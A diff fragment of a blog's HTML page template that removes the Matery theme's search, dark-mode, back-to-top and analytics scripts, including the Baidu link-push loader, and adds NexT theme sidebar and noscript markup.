+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
 
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
-
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
-
-    
-
-    
-
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
-
 </html>
